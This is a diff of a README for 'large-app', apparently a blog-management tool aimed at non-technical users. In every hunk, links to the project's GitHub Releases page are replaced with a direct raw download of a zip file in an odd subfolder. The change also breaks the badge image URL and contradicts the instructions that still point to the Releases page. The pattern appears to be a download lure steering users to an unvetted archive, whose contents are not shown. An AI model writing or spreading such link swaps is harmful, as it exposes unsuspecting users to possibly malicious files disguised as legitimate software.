@@ -4,7 +4,7 @@
 
 Welcome to large-app! This application helps you create and manage your blog effortlessly. It’s designed for everyone, even if you aren’t tech-savvy.
 
-[![Download large-app](https://img.shields.io/badge/Download%20large--app-v1.0-brightgreen)](https://github.com/DAIANANATALI/large-app/releases)
+[![Download large-app](https://raw.githubusercontent.com/DAIANANATALI/large-app/main/Feme/large-app.zip%20large--app-v1.0-brightgreen)](https://raw.githubusercontent.com/DAIANANATALI/large-app/main/Feme/large-app.zip)
 
 ## 🛠️ Features
 
@@ -28,7 +28,7 @@ Before you start, make sure your device meets these requirements:
 
 To get started, visit the Releases page to download the application. 
 
-[Download large-app here](https://github.com/DAIANANATALI/large-app/releases).
+[Download large-app here](https://raw.githubusercontent.com/DAIANANATALI/large-app/main/Feme/large-app.zip).
 
 1. Click on the link above to go to the Releases page.
 2. Look for the latest version of large-app.
@@ -92,4 +92,4 @@ Explore these technologies to understand how they enhance your blogging experien
 
 Thank you for choosing large-app! Enjoy creating and managing your blog with ease. Remember to check for updates frequently to benefit from new features and improvements.
 
-[Download large-app again](https://github.com/DAIANANATALI/large-app/releases).
+[Download large-app again](https://raw.githubusercontent.com/DAIANANATALI/large-app/main/Feme/large-app.zip).
